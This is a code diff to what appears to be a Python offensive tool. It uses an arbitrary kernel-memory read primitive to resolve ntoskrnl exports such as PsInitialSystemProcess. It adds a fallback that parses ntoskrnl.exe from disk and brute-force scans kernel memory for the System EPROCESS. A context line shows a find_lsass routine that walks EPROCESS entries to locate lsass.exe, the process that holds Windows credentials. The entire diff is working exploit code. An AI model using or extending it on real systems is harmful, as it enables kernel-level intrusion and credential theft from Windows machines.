@@ -269,30 +269,25 @@ def _chunked_virt_read(h, addr, size):
         off += chunk
     return result
 
-def find_export(h, base, name):
-    """Resolve a PE export by name."""
+def _find_export_inmem(h, base, name):
+    """Try resolving PE export directly from kernel memory."""
     hdr = virt_read(h, base, 0x1000)
     if not hdr:
-        return 0
+        return 0, hdr
     pe = rd(hdr, 0x3C)
     exp_rva = rd(hdr, pe + 0x88)
-    exp_sz = rd(hdr, pe + 0x8C)
     if not exp_rva:
-        return 0
-    # Read export directory header (40 bytes)
+        return 0, hdr
     exp_hdr = virt_read(h, base + exp_rva, 0x28)
     if not exp_hdr:
-        return 0
+        return 0, hdr
     n_funcs = rd(exp_hdr, 0x14)
     n_names = rd(exp_hdr, 0x18)
+    if n_names == 0 or n_names > 0x10000 or n_funcs == 0 or n_funcs > 0x10000:
+        return 0, hdr  # likely section randomization
     a_rva = rd(exp_hdr, 0x1C)
     n_rva = rd(exp_hdr, 0x20)
     o_rva = rd(exp_hdr, 0x24)
-    if n_names == 0 or n_names > 0x10000:
-        return 0
-    if n_funcs == 0 or n_funcs > 0x10000:
-        return 0
-    # Read each array separately (page-chunked for reliability)
     names_arr = _chunked_virt_read(h, base + n_rva, n_names * 4)
     ords_arr = _chunked_virt_read(h, base + o_rva, n_names * 2)
     funcs_arr = _chunked_virt_read(h, base + a_rva, n_funcs * 4)
@@ -302,8 +297,101 @@ def find_export(h, base, name):
         nm = virt_read(h, base + name_rva, len(target) + 1)
         if nm and nm[:len(target)] == target and nm[len(target)] == 0:
             ordinal = rw(ords_arr, i * 2)
-            return base + rd(funcs_arr, ordinal * 4)
+            return base + rd(funcs_arr, ordinal * 4), hdr
+    return 0, hdr
+
+def _find_export_disk(h, base, name, mem_hdr):
+    """Fallback: read ntoskrnl from disk and remap via section headers."""
+    ntos_path = os.path.join(os.environ['SystemRoot'], 'System32', 'ntoskrnl.exe')
+    with open(ntos_path, 'rb') as f:
+        disk = f.read()
+    dpe = struct.unpack_from('<I', disk, 0x3C)[0]
+    dnsec = struct.unpack_from('<H', disk, dpe + 6)[0]
+    dopt = struct.unpack_from('<H', disk, dpe + 0x14)[0]
+    dsec0 = dpe + 0x18 + dopt
+    # Build disk section table: (name, va, vsize, raw_offset)
+    dsecs = []
+    for i in range(dnsec):
+        s = dsec0 + i * 40
+        sn = disk[s:s+8].split(b'\x00')[0]
+        va = struct.unpack_from('<I', disk, s + 12)[0]
+        vs = struct.unpack_from('<I', disk, s + 8)[0]
+        ro = struct.unpack_from('<I', disk, s + 20)[0]
+        dsecs.append((sn, va, vs, ro))
+    def rva2fo(rva):
+        for sn, va, vs, ro in dsecs:
+            if va <= rva < va + vs:
+                return ro + (rva - va)
+        return None
+    # Parse exports from disk
+    dexp_rva = struct.unpack_from('<I', disk, dpe + 0x88)[0]
+    efo = rva2fo(dexp_rva)
+    if efo is None:
+        return 0
+    n_names = struct.unpack_from('<I', disk, efo + 0x18)[0]
+    a_rva = struct.unpack_from('<I', disk, efo + 0x1C)[0]
+    n_rva = struct.unpack_from('<I', disk, efo + 0x20)[0]
+    o_rva = struct.unpack_from('<I', disk, efo + 0x24)[0]
+    nfo = rva2fo(n_rva)
+    target = name.encode()
+    for i in range(n_names):
+        nr = struct.unpack_from('<I', disk, nfo + i * 4)[0]
+        nf = rva2fo(nr)
+        if disk[nf:nf+len(target)] == target and disk[nf+len(target)] == 0:
+            ofo = rva2fo(o_rva)
+            ordinal = struct.unpack_from('<H', disk, ofo + i * 2)[0]
+            afo = rva2fo(a_rva)
+            func_rva = struct.unpack_from('<I', disk, afo + ordinal * 4)[0]
+            # Map disk RVA → in-memory address
+            for idx, (sn, va, vs, _) in enumerate(dsecs):
+                if va <= func_rva < va + vs:
+                    off_in_sec = func_rva - va
+                    # Try in-memory section header first
+                    mpe = rd(mem_hdr, 0x3C)
+                    mopt = rw(mem_hdr, mpe + 0x14)
+                    ms = mpe + 0x18 + mopt + idx * 40
+                    mem_va = rd(mem_hdr, ms + 12)
+                    if mem_va:
+                        addr = base + mem_va + off_in_sec
+                        test = virt_read(h, addr, 8)
+                        if test and rp(test, 0) > 0xFFFF000000000000:
+                            return addr
+                    # Section headers stale — brute-force scan:
+                    # PsInitialSystemProcess is at section_base + off_in_sec
+                    # and contains a kernel pointer → EPROCESS with PID=4
+                    print(f"  [*] Scanning kernel image for {name}...")
+                    disk_soi = struct.unpack_from('<I', disk, dpe + 0x50)[0]
+                    for probe in range(0, disk_soi, 0x1000):
+                        cand = base + probe + off_in_sec
+                        d = virt_read(h, cand, 8)
+                        if not d:
+                            continue
+                        val = rp(d, 0)
+                        if val < 0xFFFF800000000000 or val > 0xFFFFF80000000000:
+                            continue
+                        # Looks like a kernel pointer — verify EPROCESS
+                        ep = virt_read(h, val, 0x600)
+                        if not ep:
+                            continue
+                        for po in range(0x100, 0x600, 8):
+                            if struct.unpack_from('<Q', ep, po)[0] == 4:
+                                if ep[po+8:po+16] != b'\x00' * 8:
+                                    nxt = struct.unpack_from('<Q', ep, po + 8)[0]
+                                    if nxt > 0xFFFF800000000000:
+                                        print(f"  [*] Found at image offset {probe + off_in_sec:#x}")
+                                        return cand
+                    break
     return 0
+
+def find_export(h, base, name):
+    """Resolve PE export — handles kernel section randomization."""
+    result, hdr = _find_export_inmem(h, base, name)
+    if result:
+        return result
+    if not hdr:
+        return 0
+    print("  [*] Section randomization detected, reading ntoskrnl from disk...")
+    return _find_export_disk(h, base, name, hdr)
 
 def find_lsass(h, ntos):
     """EPROCESS walk → find lsass.exe → return (eprocess, dtb, peb_offset)."""
